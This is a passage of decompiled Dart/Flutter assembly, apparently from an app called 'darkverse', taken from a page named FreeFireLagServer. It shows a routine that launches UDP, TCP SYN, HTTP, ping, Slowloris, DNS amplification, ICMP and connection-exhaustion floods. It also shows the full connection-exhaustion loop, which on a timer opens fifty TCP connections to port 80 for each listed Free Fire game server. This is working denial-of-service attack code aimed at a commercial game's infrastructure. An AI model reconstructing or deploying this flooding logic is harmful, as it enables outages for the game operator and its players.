    // 0x878064: r0 = _GrowableList()
    //     0x878064: bl              #0x457b90  ; [dart:core] _GrowableList::_GrowableList
    // 0x878068: LeaveFrame
    //     0x878068: mov             SP, fp
    //     0x87806c: ldp             fp, lr, [SP], #0x10
    // 0x878070: ret
    //     0x878070: ret             
    // 0x878074: r0 = StackOverflowSharedWithoutFPURegs()
    //     0x878074: bl              #0xbf7cd4  ; StackOverflowSharedWithoutFPURegsStub
    // 0x878078: b               #0x878058
  }
  static List<HttpClient> _httpClients() {
    // ** addr: 0x87807c, size: 0x38
    // 0x87807c: EnterFrame
    //     0x87807c: stp             fp, lr, [SP, #-0x10]!
    //     0x878080: mov             fp, SP
    // 0x878084: CheckStackOverflow
    //     0x878084: ldr             x16, [THR, #0x48]  ; THR::stack_limit
    //     0x878088: cmp             SP, x16
    //     0x87808c: b.ls            #0x8780ac
    // 0x878090: r1 = <HttpClient>
    //     0x878090: add             x1, PP, #0x3b, lsl #12  ; [pp+0x3be80] TypeArguments: <HttpClient>
    //     0x878094: ldr             x1, [x1, #0xe80]
    // 0x878098: r2 = 0
    //     0x878098: mov             x2, #0
    // 0x87809c: r0 = _GrowableList()
    //     0x87809c: bl              #0x457b90  ; [dart:core] _GrowableList::_GrowableList
    // 0x8780a0: LeaveFrame
    //     0x8780a0: mov             SP, fp
    //     0x8780a4: ldp             fp, lr, [SP], #0x10
    // 0x8780a8: ret
    //     0x8780a8: ret             
    // 0x8780ac: r0 = StackOverflowSharedWithoutFPURegs()
    //     0x8780ac: bl              #0xbf7cd4  ; StackOverflowSharedWithoutFPURegsStub
    // 0x8780b0: b               #0x878090
  }
  static List<Timer> _timers() {
    // ** addr: 0x8780b4, size: 0x34
    // 0x8780b4: EnterFrame
    //     0x8780b4: stp             fp, lr, [SP, #-0x10]!
    //     0x8780b8: mov             fp, SP
    // 0x8780bc: CheckStackOverflow
    //     0x8780bc: ldr             x16, [THR, #0x48]  ; THR::stack_limit
    //     0x8780c0: cmp             SP, x16
    //     0x8780c4: b.ls            #0x8780e0
    // 0x8780c8: r1 = <Timer>
    //     0x8780c8: ldr             x1, [PP, #0x4fb0]  ; [pp+0x4fb0] TypeArguments: <Timer>
    // 0x8780cc: r2 = 0
    //     0x8780cc: mov             x2, #0
    // 0x8780d0: r0 = _GrowableList()
    //     0x8780d0: bl              #0x457b90  ; [dart:core] _GrowableList::_GrowableList
    // 0x8780d4: LeaveFrame
    //     0x8780d4: mov             SP, fp
    //     0x8780d8: ldp             fp, lr, [SP], #0x10
    // 0x8780dc: ret
    //     0x8780dc: ret             
    // 0x8780e0: r0 = StackOverflowSharedWithoutFPURegs()
    //     0x8780e0: bl              #0xbf7cd4  ; StackOverflowSharedWithoutFPURegsStub
    // 0x8780e4: b               #0x8780c8
  }
  [closure] Future<void> <anonymous closure>(dynamic) async {
    // ** addr: 0x8780e8, size: 0xb8
    // 0x8780e8: EnterFrame
    //     0x8780e8: stp             fp, lr, [SP, #-0x10]!
    //     0x8780ec: mov             fp, SP
    // 0x8780f0: AllocStack(0x28)
    //     0x8780f0: sub             SP, SP, #0x28
    // 0x8780f4: SetupParameters(_FreeFireLagServerPageState this /* r1 */)
    //     0x8780f4: stur            NULL, [fp, #-8]
    //     0x8780f8: mov             x0, #0
    //     0x8780fc: add             x1, fp, w0, sxtw #2
    //     0x878100: ldr             x1, [x1, #0x10]
    //     0x878104: ldur            w2, [x1, #0x17]
    //     0x878108: add             x2, x2, HEAP, lsl #32
    //     0x87810c: stur            x2, [fp, #-0x10]
    // 0x878110: CheckStackOverflow
    //     0x878110: ldr             x16, [THR, #0x48]  ; THR::stack_limit
    //     0x878114: cmp             SP, x16
    //     0x878118: b.ls            #0x878198
    // 0x87811c: InitAsync() -> Future<void?>
    //     0x87811c: ldr             x0, [PP, #0x360]  ; [pp+0x360] TypeArguments: <void?>
    //     0x878120: bl              #0x4a3fd4  ; InitAsyncStub
    // 0x878124: r0 = heavyImpact()
    //     0x878124: bl              #0x87df40  ; [package:flutter/src/services/haptic_feedback.dart] HapticFeedback::heavyImpact
    // 0x878128: r0 = startLag()
    //     0x878128: bl              #0x8781a0  ; [package:darkverse/FreeFireLagServer.dart] _FreeFireLagServerPageState::startLag
    // 0x87812c: mov             x1, x0
    // 0x878130: stur            x1, [fp, #-0x18]
    // 0x878134: r0 = Await()
    //     0x878134: bl              #0x4a3d90  ; AwaitStub
    // 0x878138: ldur            x0, [fp, #-0x10]
    // 0x87813c: LoadField: r3 = r0->field_13
    //     0x87813c: ldur            w3, [x0, #0x13]
    // 0x878140: DecompressPointer r3
    //     0x878140: add             x3, x3, HEAP, lsl #32
    // 0x878144: stur            x3, [fp, #-0x18]
    // 0x878148: r1 = Function '<anonymous closure>':.
    //     0x878148: add             x1, PP, #0x3b, lsl #12  ; [pp+0x3be88] Function: [dart:ui] Shader::Shader._ (0xbf1c14)
    //     0x87814c: ldr             x1, [x1, #0xe88]
    // 0x878150: r2 = Null
    //     0x878150: mov             x2, NULL
    // 0x878154: r0 = AllocateClosure()
    //     0x878154: bl              #0xbf6eac  ; AllocateClosureStub
    // 0x878158: ldur            x16, [fp, #-0x18]
    // 0x87815c: stp             x0, x16, [SP]
    // 0x878160: ldur            x0, [fp, #-0x18]
    // 0x878164: ClosureCall
    //     0x878164: ldr             x4, [PP, #0x1e8]  ; [pp+0x1e8] List(5) [0, 0x2, 0x2, 0x2, Null]
    //     0x878168: ldur            x2, [x0, #0x1f]
    //     0x87816c: blr             x2
    // 0x878170: ldur            x0, [fp, #-0x10]
    // 0x878174: LoadField: r1 = r0->field_f
    //     0x878174: ldur            w1, [x0, #0xf]
    // 0x878178: DecompressPointer r1
    //     0x878178: add             x1, x1, HEAP, lsl #32
    // 0x87817c: r0 = of()
    //     0x87817c: bl              #0x6ad584  ; [package:flutter/src/material/scaffold.dart] ScaffoldMessenger::of
    // 0x878180: mov             x1, x0
    // 0x878184: r2 = Instance_SnackBar
    //     0x878184: add             x2, PP, #0x3b, lsl #12  ; [pp+0x3be90] Obj!SnackBar@a39271
    //     0x878188: ldr             x2, [x2, #0xe90]
    // 0x87818c: r0 = showSnackBar()
    //     0x87818c: bl              #0x6acb84  ; [package:flutter/src/material/scaffold.dart] ScaffoldMessengerState::showSnackBar
    // 0x878190: r0 = Null
    //     0x878190: mov             x0, NULL
    // 0x878194: r0 = ReturnAsyncNotFuture()
    //     0x878194: b               #0x4a3bc8  ; ReturnAsyncNotFutureStub
    // 0x878198: r0 = StackOverflowSharedWithoutFPURegs()
    //     0x878198: bl              #0xbf7cd4  ; StackOverflowSharedWithoutFPURegsStub
    // 0x87819c: b               #0x87811c
  }
  static _ startLag(/* No info */) async {
    // ** addr: 0x8781a0, size: 0xec
    // 0x8781a0: EnterFrame
    //     0x8781a0: stp             fp, lr, [SP, #-0x10]!
    //     0x8781a4: mov             fp, SP
    // 0x8781a8: AllocStack(0x8)
    //     0x8781a8: sub             SP, SP, #8
    // 0x8781ac: SetupParameters()
    //     0x8781ac: stur            NULL, [fp, #-8]
    // 0x8781b0: CheckStackOverflow
    //     0x8781b0: ldr             x16, [THR, #0x48]  ; THR::stack_limit
    //     0x8781b4: cmp             SP, x16
    //     0x8781b8: b.ls            #0x878284
    // 0x8781bc: InitAsync() -> Future<bool>
    //     0x8781bc: ldr             x0, [PP, #0x1d78]  ; [pp+0x1d78] TypeArguments: <bool>
    //     0x8781c0: bl              #0x4a3fd4  ; InitAsyncStub
    // 0x8781c4: r0 = LoadStaticField(0xd6c)
    //     0x8781c4: ldr             x0, [THR, #0x78]  ; THR::field_table_values
    //     0x8781c8: ldr             x0, [x0, #0x1ad8]
    // 0x8781cc: tbnz            w0, #4, #0x8781d8
    // 0x8781d0: r0 = false
    //     0x8781d0: add             x0, NULL, #0x30  ; false
    // 0x8781d4: r0 = ReturnAsyncNotFuture()
    //     0x8781d4: b               #0x4a3bc8  ; ReturnAsyncNotFutureStub
    // 0x8781d8: r2 = true
    //     0x8781d8: add             x2, NULL, #0x20  ; true
    // 0x8781dc: StoreStaticField(0xd6c, r2)
    //     0x8781dc: ldr             x0, [THR, #0x78]  ; THR::field_table_values
    //     0x8781e0: str             x2, [x0, #0x1ad8]
    // 0x8781e4: r2 = 0
    //     0x8781e4: mov             x2, #0
    // 0x8781e8: StoreStaticField(0xd70, r2)
    //     0x8781e8: ldr             x0, [THR, #0x78]  ; THR::field_table_values
    //     0x8781ec: str             x2, [x0, #0x1ae0]
    // 0x8781f0: r1 = <Timer>
    //     0x8781f0: ldr             x1, [PP, #0x4fb0]  ; [pp+0x4fb0] TypeArguments: <Timer>
    // 0x8781f4: r2 = 0
    //     0x8781f4: mov             x2, #0
    // 0x8781f8: r0 = _GrowableList()
    //     0x8781f8: bl              #0x457b90  ; [dart:core] _GrowableList::_GrowableList
    // 0x8781fc: mov             x2, x0
    // 0x878200: StoreStaticField(0xd74, r2)
    //     0x878200: ldr             x0, [THR, #0x78]  ; THR::field_table_values
    //     0x878204: str             x2, [x0, #0x1ae8]
    // 0x878208: r1 = <HttpClient>
    //     0x878208: add             x1, PP, #0x3b, lsl #12  ; [pp+0x3be80] TypeArguments: <HttpClient>
    //     0x87820c: ldr             x1, [x1, #0xe80]
    // 0x878210: r2 = 0
    //     0x878210: mov             x2, #0
    // 0x878214: r0 = _GrowableList()
    //     0x878214: bl              #0x457b90  ; [dart:core] _GrowableList::_GrowableList
    // 0x878218: mov             x2, x0
    // 0x87821c: StoreStaticField(0xd78, r2)
    //     0x87821c: ldr             x0, [THR, #0x78]  ; THR::field_table_values
    //     0x878220: str             x2, [x0, #0x1af0]
    // 0x878224: r1 = <RawDatagramSocket>
    //     0x878224: add             x1, PP, #0x37, lsl #12  ; [pp+0x37448] TypeArguments: <RawDatagramSocket>
    //     0x878228: ldr             x1, [x1, #0x448]
    // 0x87822c: r2 = 0
    //     0x87822c: mov             x2, #0
    // 0x878230: r0 = _GrowableList()
    //     0x878230: bl              #0x457b90  ; [dart:core] _GrowableList::_GrowableList
    // 0x878234: mov             x2, x0
    // 0x878238: StoreStaticField(0xd7c, r2)
    //     0x878238: ldr             x0, [THR, #0x78]  ; THR::field_table_values
    //     0x87823c: str             x2, [x0, #0x1af8]
    // 0x878240: r1 = <Socket>
    //     0x878240: add             x1, PP, #0x10, lsl #12  ; [pp+0x10238] TypeArguments: <Socket>
    //     0x878244: ldr             x1, [x1, #0x238]
    // 0x878248: r2 = 0
    //     0x878248: mov             x2, #0
    // 0x87824c: r0 = _GrowableList()
    //     0x87824c: bl              #0x457b90  ; [dart:core] _GrowableList::_GrowableList
    // 0x878250: mov             x2, x0
    // 0x878254: StoreStaticField(0xd80, r2)
    //     0x878254: ldr             x0, [THR, #0x78]  ; THR::field_table_values
    //     0x878258: str             x2, [x0, #0x1b00]
    // 0x87825c: r0 = _startUdpFlood()
    //     0x87825c: bl              #0x87d4fc  ; [package:darkverse/FreeFireLagServer.dart] _FreeFireLagServerPageState::_startUdpFlood
    // 0x878260: r0 = _startTcpSynFlood()
    //     0x878260: bl              #0x87cda8  ; [package:darkverse/FreeFireLagServer.dart] _FreeFireLagServerPageState::_startTcpSynFlood
    // 0x878264: r0 = _startHttpFlood()
    //     0x878264: bl              #0x87c628  ; [package:darkverse/FreeFireLagServer.dart] _FreeFireLagServerPageState::_startHttpFlood
    // 0x878268: r0 = _startPingFlood()
    //     0x878268: bl              #0x87c308  ; [package:darkverse/FreeFireLagServer.dart] _FreeFireLagServerPageState::_startPingFlood
    // 0x87826c: r0 = _startSlowloris()
    //     0x87826c: bl              #0x87bbdc  ; [package:darkverse/FreeFireLagServer.dart] _FreeFireLagServerPageState::_startSlowloris
    // 0x878270: r0 = _startDnsAmplification()
    //     0x878270: bl              #0x87abb4  ; [package:darkverse/FreeFireLagServer.dart] _FreeFireLagServerPageState::_startDnsAmplification
    // 0x878274: r0 = _startIcmpFlood()
    //     0x878274: bl              #0x87862c  ; [package:darkverse/FreeFireLagServer.dart] _FreeFireLagServerPageState::_startIcmpFlood
    // 0x878278: r0 = _startConnectionExhaustion()
    //     0x878278: bl              #0x87828c  ; [package:darkverse/FreeFireLagServer.dart] _FreeFireLagServerPageState::_startConnectionExhaustion
    // 0x87827c: r0 = true
    //     0x87827c: add             x0, NULL, #0x20  ; true
    // 0x878280: r0 = ReturnAsyncNotFuture()
    //     0x878280: b               #0x4a3bc8  ; ReturnAsyncNotFutureStub
    // 0x878284: r0 = StackOverflowSharedWithoutFPURegs()
    //     0x878284: bl              #0xbf7cd4  ; StackOverflowSharedWithoutFPURegsStub
    // 0x878288: b               #0x8781bc
  }
  static void _startConnectionExhaustion() {
    // ** addr: 0x87828c, size: 0xf0
    // 0x87828c: EnterFrame
    //     0x87828c: stp             fp, lr, [SP, #-0x10]!
    //     0x878290: mov             fp, SP
    // 0x878294: AllocStack(0x18)
    //     0x878294: sub             SP, SP, #0x18
    // 0x878298: CheckStackOverflow
    //     0x878298: ldr             x16, [THR, #0x48]  ; THR::stack_limit
    //     0x87829c: cmp             SP, x16
    //     0x8782a0: b.ls            #0x878374
    // 0x8782a4: r1 = Function '<anonymous closure>': static.
    //     0x8782a4: add             x1, PP, #0x3b, lsl #12  ; [pp+0x3be98] AnonymousClosure: static (0x87837c), in [package:darkverse/FreeFireLagServer.dart] _FreeFireLagServerPageState::_startConnectionExhaustion (0x87828c)
    //     0x8782a8: ldr             x1, [x1, #0xe98]
    // 0x8782ac: r2 = Null
    //     0x8782ac: mov             x2, NULL
    // 0x8782b0: r0 = AllocateClosure()
    //     0x8782b0: bl              #0xbf6eac  ; AllocateClosureStub
    // 0x8782b4: mov             x3, x0
    // 0x8782b8: r1 = Null
    //     0x8782b8: mov             x1, NULL
    // 0x8782bc: r2 = Instance_Duration
    //     0x8782bc: add             x2, PP, #0x10, lsl #12  ; [pp+0x10e58] Obj!Duration@a440f1
    //     0x8782c0: ldr             x2, [x2, #0xe58]
    // 0x8782c4: r0 = Timer.periodic()
    //     0x8782c4: bl              #0x570930  ; [dart:async] Timer::Timer.periodic
    // 0x8782c8: stur            x0, [fp, #-8]
    // 0x8782cc: r0 = LoadStaticField(0xd74)
    //     0x8782cc: ldr             x0, [THR, #0x78]  ; THR::field_table_values
    //     0x8782d0: ldr             x0, [x0, #0x1ae8]
    // 0x8782d4: ldr             x16, [THR, #0x90]  ; THR::object_sentinel
    // 0x8782d8: cmp             w0, w16
    // 0x8782dc: b.ne            #0x8782ec
    // 0x8782e0: r2 = _timers
    //     0x8782e0: add             x2, PP, #0x3b, lsl #12  ; [pp+0x3be60] Field <_FreeFireLagServerPageState@829239838._timers@829239838>: static late (offset: 0xd74)
    //     0x8782e4: ldr             x2, [x2, #0xe60]
    // 0x8782e8: r0 = InitLateStaticField()
    //     0x8782e8: bl              #0xbf5cf4  ; InitLateStaticFieldStub
    // 0x8782ec: stur            x0, [fp, #-0x18]
    // 0x8782f0: LoadField: r1 = r0->field_b
    //     0x8782f0: ldur            w1, [x0, #0xb]
    // 0x8782f4: LoadField: r2 = r0->field_f
    //     0x8782f4: ldur            w2, [x0, #0xf]
    // 0x8782f8: DecompressPointer r2
    //     0x8782f8: add             x2, x2, HEAP, lsl #32
    // 0x8782fc: LoadField: r3 = r2->field_b
    //     0x8782fc: ldur            w3, [x2, #0xb]
    // 0x878300: r2 = LoadInt32Instr(r1)
    //     0x878300: sbfx            x2, x1, #1, #0x1f
    // 0x878304: stur            x2, [fp, #-0x10]
    // 0x878308: r1 = LoadInt32Instr(r3)
    //     0x878308: sbfx            x1, x3, #1, #0x1f
    // 0x87830c: cmp             x2, x1
    // 0x878310: b.ne            #0x87831c
    // 0x878314: mov             x1, x0
    // 0x878318: r0 = _growToNextCapacity()
    //     0x878318: bl              #0x4578a8  ; [dart:core] _GrowableList::_growToNextCapacity
    // 0x87831c: ldur            x2, [fp, #-0x18]
    // 0x878320: ldur            x3, [fp, #-0x10]
    // 0x878324: add             x4, x3, #1
    // 0x878328: lsl             x5, x4, #1
    // 0x87832c: StoreField: r2->field_b = r5
    //     0x87832c: stur            w5, [x2, #0xb]
    // 0x878330: LoadField: r1 = r2->field_f
    //     0x878330: ldur            w1, [x2, #0xf]
    // 0x878334: DecompressPointer r1
    //     0x878334: add             x1, x1, HEAP, lsl #32
    // 0x878338: ldur            x0, [fp, #-8]
    // 0x87833c: ArrayStore: r1[r3] = r0  ; List_4
    //     0x87833c: add             x25, x1, x3, lsl #2
    //     0x878340: add             x25, x25, #0xf
    //     0x878344: str             w0, [x25]
    //     0x878348: tbz             w0, #0, #0x878364
    //     0x87834c: ldurb           w16, [x1, #-1]
    //     0x878350: ldurb           w17, [x0, #-1]
    //     0x878354: and             x16, x17, x16, lsr #2
    //     0x878358: tst             x16, HEAP, lsr #32
    //     0x87835c: b.eq            #0x878364
    //     0x878360: bl              #0xbf5df0  ; ArrayWriteBarrierStub
    // 0x878364: r0 = Null
    //     0x878364: mov             x0, NULL
    // 0x878368: LeaveFrame
    //     0x878368: mov             SP, fp
    //     0x87836c: ldp             fp, lr, [SP], #0x10
    // 0x878370: ret
    //     0x878370: ret             
    // 0x878374: r0 = StackOverflowSharedWithoutFPURegs()
    //     0x878374: bl              #0xbf7cd4  ; StackOverflowSharedWithoutFPURegsStub
    // 0x878378: b               #0x8782a4
  }
  [closure] static Future<void> <anonymous closure>(dynamic, Timer) async {
    // ** addr: 0x87837c, size: 0x2b0
    // 0x87837c: EnterFrame
    //     0x87837c: stp             fp, lr, [SP, #-0x10]!
    //     0x878380: mov             fp, SP
    // 0x878384: AllocStack(0xb0)
    //     0x878384: sub             SP, SP, #0xb0
    // 0x878388: SetupParameters(dynamic _ /* r1 */)
    //     0x878388: stur            NULL, [fp, #-8]
    //     0x87838c: mov             x0, #0
    //     0x878390: add             x1, fp, w0, sxtw #2
    //     0x878394: ldr             x1, [x1, #0x18]
    //     0x878398: ldur            w2, [x1, #0x17]
    //     0x87839c: add             x2, x2, HEAP, lsl #32
    //     0x8783a0: stur            x2, [fp, #-0x70]
    // 0x8783a4: CheckStackOverflow
    //     0x8783a4: ldr             x16, [THR, #0x48]  ; THR::stack_limit
    //     0x8783a8: cmp             SP, x16
    //     0x8783ac: b.ls            #0x878610
    // 0x8783b0: InitAsync() -> Future<void?>
    //     0x8783b0: ldr             x0, [PP, #0x360]  ; [pp+0x360] TypeArguments: <void?>
    //     0x8783b4: bl              #0x4a3fd4  ; InitAsyncStub
    // 0x8783b8: r0 = LoadStaticField(0xd6c)
    //     0x8783b8: ldr             x0, [THR, #0x78]  ; THR::field_table_values
    //     0x8783bc: ldr             x0, [x0, #0x1ad8]
    // 0x8783c0: tbz             w0, #4, #0x8783cc
    // 0x8783c4: r0 = Null
    //     0x8783c4: mov             x0, NULL
    // 0x8783c8: r0 = ReturnAsyncNotFuture()
    //     0x8783c8: b               #0x4a3bc8  ; ReturnAsyncNotFutureStub
    // 0x8783cc: r0 = LoadStaticField(0xd84)
    //     0x8783cc: ldr             x0, [THR, #0x78]  ; THR::field_table_values
    //     0x8783d0: ldr             x0, [x0, #0x1b08]
    // 0x8783d4: ldr             x16, [THR, #0x90]  ; THR::object_sentinel
    // 0x8783d8: cmp             w0, w16
    // 0x8783dc: b.ne            #0x8783ec
    // 0x8783e0: r2 = freefireServers
    //     0x8783e0: add             x2, PP, #0x3b, lsl #12  ; [pp+0x3bd98] Field <_FreeFireLagServerPageState@829239838.freefireServers>: static late final (offset: 0xd84)
    //     0x8783e4: ldr             x2, [x2, #0xd98]
    // 0x8783e8: r0 = InitLateFinalStaticField()
    //     0x8783e8: bl              #0xbf5c8c  ; InitLateFinalStaticFieldStub
    // 0x8783ec: r1 = <String>
    //     0x8783ec: ldr             x1, [PP, #0x3e0]  ; [pp+0x3e0] TypeArguments: <String>
    // 0x8783f0: stur            x0, [fp, #-0x70]
    // 0x8783f4: r0 = ListIterator()
    //     0x8783f4: bl              #0x49a80c  ; AllocateListIteratorStub -> ListIterator<X0> (size=0x24)
    // 0x8783f8: mov             x3, x0
    // 0x8783fc: ldur            x2, [fp, #-0x70]
    // 0x878400: stur            x3, [fp, #-0x90]
    // 0x878404: StoreField: r3->field_b = r2
    //     0x878404: stur            w2, [x3, #0xb]
    // 0x878408: LoadField: r0 = r2->field_b
    //     0x878408: ldur            w0, [x2, #0xb]
    // 0x87840c: r4 = LoadInt32Instr(r0)
    //     0x87840c: sbfx            x4, x0, #1, #0x1f
    // 0x878410: stur            x4, [fp, #-0x88]
    // 0x878414: StoreField: r3->field_f = r4
    //     0x878414: stur            x4, [x3, #0xf]
    // 0x878418: ArrayStore: r3[0] = rZR  ; List_8
    //     0x878418: stur            xzr, [x3, #0x17]
    // 0x87841c: CheckStackOverflow
    //     0x87841c: ldr             x16, [THR, #0x48]  ; THR::stack_limit
    //     0x878420: cmp             SP, x16
    //     0x878424: b.ls            #0x878618
    // 0x878428: LoadField: r0 = r2->field_b
    //     0x878428: ldur            w0, [x2, #0xb]
    // 0x87842c: r1 = LoadInt32Instr(r0)
    //     0x87842c: sbfx            x1, x0, #1, #0x1f
    // 0x878430: cmp             x4, x1
    // 0x878434: b.ne            #0x8785f0
    // 0x878438: ArrayLoad: r5 = r3[0]  ; List_8
    //     0x878438: ldur            x5, [x3, #0x17]
    // 0x87843c: cmp             x5, x1
    // 0x878440: b.ge            #0x8785e0
    // 0x878444: mov             x0, x1
    // 0x878448: mov             x1, x5
    // 0x87844c: cmp             x1, x0
    // 0x878450: b.hs            #0x878620
    // 0x878454: LoadField: r0 = r2->field_f
    //     0x878454: ldur            w0, [x2, #0xf]
    // 0x878458: DecompressPointer r0
    //     0x878458: add             x0, x0, HEAP, lsl #32
    // 0x87845c: ArrayLoad: r1 = r0[r5]  ; Unknown_4
    //     0x87845c: add             x16, x0, x5, lsl #2
    //     0x878460: ldur            w1, [x16, #0xf]
    // 0x878464: DecompressPointer r1
    //     0x878464: add             x1, x1, HEAP, lsl #32
    // 0x878468: mov             x0, x1
    // 0x87846c: stur            x1, [fp, #-0x80]
    // 0x878470: StoreField: r3->field_1f = r0
    //     0x878470: stur            w0, [x3, #0x1f]
    //     0x878474: ldurb           w16, [x3, #-1]
    //     0x878478: ldurb           w17, [x0, #-1]
    //     0x87847c: and             x16, x17, x16, lsr #2
    //     0x878480: tst             x16, HEAP, lsr #32
    //     0x878484: b.eq            #0x87848c
    //     0x878488: bl              #0xbf6274  ; WriteBarrierWrappersStub
    // 0x87848c: add             x0, x5, #1
    // 0x878490: ArrayStore: r3[0] = r0  ; List_8
    //     0x878490: stur            x0, [x3, #0x17]
    // 0x878494: r0 = 0
    //     0x878494: mov             x0, #0
    // 0x878498: stur            x0, [fp, #-0x78]
    // 0x87849c: CheckStackOverflow
    //     0x87849c: ldr             x16, [THR, #0x48]  ; THR::stack_limit
    //     0x8784a0: cmp             SP, x16
    //     0x8784a4: b.ls            #0x878624
    // 0x8784a8: cmp             x0, #0x32
    // 0x8784ac: b.ge            #0x8785d0
    // 0x8784b0: r0 = current()
    //     0x8784b0: bl              #0x46ef0c  ; [dart:io] IOOverrides::current
    // 0x8784b4: ldur            x1, [fp, #-0x80]
    // 0x8784b8: r2 = 80
    //     0x8784b8: mov             x2, #0x50
    // 0x8784bc: r3 = Instance_Duration
    //     0x8784bc: ldr             x3, [PP, #0x588]  ; [pp+0x588] Obj!Duration@a44141
    // 0x8784c0: r0 = _connect()
    //     0x8784c0: bl              #0x78128c  ; [dart:io] Socket::_connect
    // 0x8784c4: mov             x1, x0
    // 0x8784c8: stur            x1, [fp, #-0x98]
    // 0x8784cc: r0 = Await()
    //     0x8784cc: bl              #0x4a3d90  ; AwaitStub
    // 0x8784d0: stur            x0, [fp, #-0x98]
    // 0x8784d4: r0 = LoadStaticField(0xd80)
    //     0x8784d4: ldr             x0, [THR, #0x78]  ; THR::field_table_values
    //     0x8784d8: ldr             x0, [x0, #0x1b00]
    // 0x8784dc: ldr             x16, [THR, #0x90]  ; THR::object_sentinel
    // 0x8784e0: cmp             w0, w16
    // 0x8784e4: b.ne            #0x8784f4
    // 0x8784e8: r2 = _tcpSockets
    //     0x8784e8: add             x2, PP, #0x3b, lsl #12  ; [pp+0x3be78] Field <_FreeFireLagServerPageState@829239838._tcpSockets@829239838>: static late (offset: 0xd80)
    //     0x8784ec: ldr             x2, [x2, #0xe78]
    // 0x8784f0: r0 = InitLateStaticField()
    //     0x8784f0: bl              #0xbf5cf4  ; InitLateStaticFieldStub
    // 0x8784f4: stur            x0, [fp, #-0xb0]
    // 0x8784f8: LoadField: r2 = r0->field_b
    //     0x8784f8: ldur            w2, [x0, #0xb]
    // 0x8784fc: stur            x2, [fp, #-0xa8]
    // 0x878500: LoadField: r1 = r0->field_f
    //     0x878500: ldur            w1, [x0, #0xf]
    // 0x878504: DecompressPointer r1
    //     0x878504: add             x1, x1, HEAP, lsl #32
    // 0x878508: LoadField: r3 = r1->field_b
    //     0x878508: ldur            w3, [x1, #0xb]
    // 0x87850c: r4 = LoadInt32Instr(r2)
    //     0x87850c: sbfx            x4, x2, #1, #0x1f
    // 0x878510: stur            x4, [fp, #-0xa0]
    // 0x878514: r1 = LoadInt32Instr(r3)
    //     0x878514: sbfx            x1, x3, #1, #0x1f
    // 0x878518: cmp             x4, x1
    // 0x87851c: b.ne            #0x878528
    // 0x878520: mov             x1, x0
    // 0x878524: r0 = _growToNextCapacity()
    //     0x878524: bl              #0x4578a8  ; [dart:core] _GrowableList::_growToNextCapacity
    // 0x878528: ldur            x0, [fp, #-0xb0]
    // 0x87852c: ldur            x2, [fp, #-0xa0]
    // 0x878530: add             x1, x2, #1
    // 0x878534: lsl             x3, x1, #1
    // 0x878538: StoreField: r0->field_b = r3
    //     0x878538: stur            w3, [x0, #0xb]
    // 0x87853c: LoadField: r1 = r0->field_f
    //     0x87853c: ldur            w1, [x0, #0xf]
    // 0x878540: DecompressPointer r1
    //     0x878540: add             x1, x1, HEAP, lsl #32
    // 0x878544: ldur            x0, [fp, #-0x98]
    // 0x878548: ArrayStore: r1[r2] = r0  ; List_4
    //     0x878548: add             x25, x1, x2, lsl #2
    //     0x87854c: add             x25, x25, #0xf
    //     0x878550: str             w0, [x25]
    //     0x878554: tbz             w0, #0, #0x878570
    //     0x878558: ldurb           w16, [x1, #-1]
    //     0x87855c: ldurb           w17, [x0, #-1]
    //     0x878560: and             x16, x17, x16, lsr #2
    //     0x878564: tst             x16, HEAP, lsr #32
    //     0x878568: b.eq            #0x878570
    //     0x87856c: bl              #0xbf5df0  ; ArrayWriteBarrierStub
    // 0x878570: r0 = LoadStaticField(0xd70)
    //     0x878570: ldr             x0, [THR, #0x78]  ; THR::field_table_values
    //     0x878574: ldr             x0, [x0, #0x1ae0]
    // 0x878578: r1 = LoadInt32Instr(r0)
    //     0x878578: sbfx            x1, x0, #1, #0x1f
    //     0x87857c: tbz             w0, #0, #0x878584
    //     0x878580: ldur            x1, [x0, #7]
    // 0x878584: add             x2, x1, #1
    // 0x878588: r0 = BoxInt64Instr(r2)
    //     0x878588: sbfiz           x0, x2, #1, #0x1f
    //     0x87858c: cmp             x2, x0, asr #1
    //     0x878590: b.eq            #0x87859c
    //     0x878594: bl              #0xbf7e54  ; AllocateMintSharedWithoutFPURegsStub
    //     0x878598: stur            x2, [x0, #7]
    // 0x87859c: mov             x2, x0
    // 0x8785a0: StoreStaticField(0xd70, r2)
    //     0x8785a0: ldr             x0, [THR, #0x78]  ; THR::field_table_values
    //     0x8785a4: str             x2, [x0, #0x1ae0]
    // 0x8785a8: b               #0x8785b0
    // 0x8785ac: sub             SP, fp, #0xb0
    // 0x8785b0: ldur            x0, [fp, #-0x78]
    // 0x8785b4: add             x1, x0, #1
    // 0x8785b8: mov             x0, x1
    // 0x8785bc: ldur            x2, [fp, #-0x70]
    // 0x8785c0: ldur            x3, [fp, #-0x90]
    // 0x8785c4: ldur            x4, [fp, #-0x88]
    // 0x8785c8: ldur            x1, [fp, #-0x80]
    // 0x8785cc: b               #0x878498
    // 0x8785d0: ldur            x2, [fp, #-0x70]
    // 0x8785d4: ldur            x3, [fp, #-0x90]
    // 0x8785d8: ldur            x4, [fp, #-0x88]
    // 0x8785dc: b               #0x87841c
    // 0x8785e0: mov             x0, x3
    // 0x8785e4: StoreField: r0->field_1f = rNULL
    //     0x8785e4: stur            NULL, [x0, #0x1f]
    // 0x8785e8: r0 = Null
    //     0x8785e8: mov             x0, NULL
    // 0x8785ec: r0 = ReturnAsyncNotFuture()
    //     0x8785ec: b               #0x4a3bc8  ; ReturnAsyncNotFutureStub
    // 0x8785f0: mov             x0, x2
    // 0x8785f4: r0 = ConcurrentModificationError()
    //     0x8785f4: bl              #0x4576a0  ; AllocateConcurrentModificationErrorStub -> ConcurrentModificationError (size=0x10)
    // 0x8785f8: mov             x1, x0
    // 0x8785fc: ldur            x0, [fp, #-0x70]
    // 0x878600: StoreField: r1->field_b = r0
    //     0x878600: stur            w0, [x1, #0xb]
    // 0x878604: mov             x0, x1
    // 0x878608: r0 = Throw()
    //     0x878608: bl              #0xbf5dcc  ; ThrowStub
    // 0x87860c: brk             #0
    // 0x878610: r0 = StackOverflowSharedWithoutFPURegs()
    //     0x878610: bl              #0xbf7cd4  ; StackOverflowSharedWithoutFPURegsStub
    // 0x878614: b               #0x8783b0
    // 0x878618: r0 = StackOverflowSharedWithoutFPURegs()
    //     0x878618: bl              #0xbf7cd4  ; StackOverflowSharedWithoutFPURegsStub
    // 0x87861c: b               #0x878428
    // 0x878620: r0 = RangeErrorSharedWithoutFPURegs()
    //     0x878620: bl              #0xbf8204  ; RangeErrorSharedWithoutFPURegsStub
    // 0x878624: r0 = StackOverflowSharedWithoutFPURegs()
    //     0x878624: bl              #0xbf7cd4  ; StackOverflowSharedWithoutFPURegsStub
